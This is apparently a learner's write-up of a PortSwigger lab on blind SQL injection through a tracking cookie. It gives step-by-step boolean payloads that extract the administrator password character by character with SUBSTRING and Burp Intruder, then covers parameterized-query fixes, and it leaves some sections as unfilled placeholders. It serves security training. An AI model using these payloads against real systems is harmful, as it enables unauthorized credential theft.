## Goal: 
The lab is vulnerable to blind SQL injection through a tracking cookie. The application does not return SQL query results directly, so UNION-based attacks are ineffective. Instead, we infer information by observing conditional responses. Specifically, we extract the administrator's password character by character: for each correct guess, the application displays "Welcome back"; otherwise, it displays nothing, allowing us to infer the password through binary search logic.

## Lab details
Lab: Blind SQL injection with conditional responses

Level: Practitioner

Vulnerability Class: SQL Injection — Blind 

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Date Completed: 27-Jul-2026

Time to Solve: 1 hour

## Vulnerability Summary
The application is vulnerable to blind SQL injection through an insecure tracking cookie. The application uses a TrackingID cookie that is directly concatenated into a SQL query without parameterization. When a valid tracking ID is found, the application returns a "Welcome back" message; otherwise, it returns a generic response. By appending conditional SQL statements such as xyz' AND (SELECT ...)='a', an attacker can observe these responses to infer information from the database. If exploited in a real application, an attacker can systematically extract sensitive data such as passwords or other confidential information stored in the database.

## Reconnaissance
### Indicators Observed
1. Conditional response behavior: The application displays "Welcome back" when the tracking ID matches, indicating a successful query condition.
2. SQL injection point: Appending SQL syntax to the TrackingID cookie parameter affects the application's logic, confirming an injectable parameter.
3. No error-based feedback: The application does not return SQL errors, confirming this is a blind injection scenario where inference is required.

### Reconnaissance Steps
1. Trigger using conditional responses. (1=1, 1=2) to confirm injection.
2. Determine the database structure by verifying the existence of tables (e.g., users table).
3. Verify the target user (administrator) exists within the identified table.
4. Determine the length of the target field (password) using `LENGTH()` function.
5. Extract the password one character at a time using SUBSTRING() with brute force.
6. Verify the extracted credentials by logging in.

## Exploitation — Step by Step
### Step 1: Trigger using conditional responses.
To confirm the injection point and determine how the application behaves with true and false conditions:

True condition — application displays "Welcome back":

```text
TrackingId=xyz' AND '1'='1
```
False condition — application does not display "Welcome back":

```text
TrackingId=xyz' AND '1'='2
```
Analysis: The different responses confirm that SQL conditions in the cookie parameter are being evaluated, establishing a blind injection point where we can infer truth values from application behavior.


### Step 2: Verify table
Confirm the `users` table exists by checking if a query returns a row:
```text
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
Expected result: If the table exists, the condition evaluates to true and the application displays "Welcome back."

### Step 3: Verify the Administrator User Exists
Confirm that a user with username `administrator` exists:
```text
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
Expected result: If the user exists, the query returns a row and the condition is true, displaying "Welcome back."

### Step 4: Determine password length
se the `LENGTH()` function to determine how many characters the password contains. Test incrementally (1–21 characters):

```text
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
```
Replace N with incrementing values until the condition returns false. The password length is the highest value that returns true + 1.

### Step 5: Extract the Password Character by Character
Use `SUBSTRING()` to extract one character at a time. For each position, test characters from **'a' to 'z' and '0' to '9'**:

```text
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
Replace the second parameter (position) incrementally from 1 to the password length, and replace the comparison character ('a') with each possible character. When the condition returns true (displays "Welcome back"), that character has been identified.

Automated approach: Use Burp Suite Intruder to systematically test all possible characters at each position, identifying matches by the "Welcome back" response.

### Step6: VVerify the Extracted Password
Once all characters have been extracted, use the obtained credentials to log in to the administrator account, confirming the validity of the extracted password.

### Key Payload(s)
```text
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
Reconstructed SQL query (Step 5 example):

```sql
SELECT TrackingId FROM tracking WHERE TrackingId = 'xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
```
**Automated exploitation:** Using Burp Suite Intruder, we set the payload position at the character being tested and iterate through the alphabet. For each request, we observe the response: if "Welcome back" appears, the character is correct; if not, we try the next character. Repeat for each position in the password.

### Tools Used
 Burp Suite Repeater
 Burp Suite Intruder


## The Fix
[Specific, code-level remediation. Match the fix to the stack if you can.]
java// Spring Boot — parameterized query
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);
Additional mitigations:

[e.g., Least privilege DB user — app user should not have DROP or ALTER rights]
[e.g., WAF rule to flag SQL metacharacters in input]
[e.g., Error handling — never expose raw SQL errors to the client]

Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```

Additional mitigations:

- Least privilege database user: The application database account should have minimal permissions. It should not be able to query sensitive tables unless necessary, and certainly should not have access to the information_schema.
- Input validation: Whitelist allowed tracking ID formats (e.g., alphanumeric only, specific length).
- Error handling: Never expose database error messages to the client. Use generic error responses.
- Secure password storage: Passwords should be hashed with a strong algorithm (bcrypt, Argon2) rather than stored in plaintext, preventing their extraction even if the injection is successful.
- Web Application Firewall (WAF) rules: Flag or block requests containing SQL metacharacters (', --, /*, etc.) in sensitive parameters.


## What I Found Interesting / Unexpected
What was particularly insightful about blind SQL injection is that despite the application not returning query results, an attacker can still extract arbitrary data through inference. The conditional response pattern—where a true condition produces a different UI output than a false condition—becomes the attacker's oracle. This highlights how even "silent" SQL failures can leak information if the application's behavior changes based on query success or failure. In many applications, developers assume that not displaying SQL errors makes them safe from injection, but they fail to realize that side effects (response differences, timing delays, boolean-based inference) are equally exploitable. This taught me that security requires thinking beyond the obvious attack vectors.

## Real-World Relevance
todo


## Connections to My Own Projects
TBD

TBD

## Takeaway
Blind SQL injection is a serious vulnerability that exploits conditional application behavior to extract data without requiring direct query result exposure. The key defense is parameterized queries, which prevent user input from altering SQL structure. Additionally, developers must adopt a defense-in-depth approach: implement least privilege database access, avoid exposing database errors, and use secure password storage mechanisms so that even if an attacker extracts data through injection, sensitive information like passwords are not exposed in plaintext.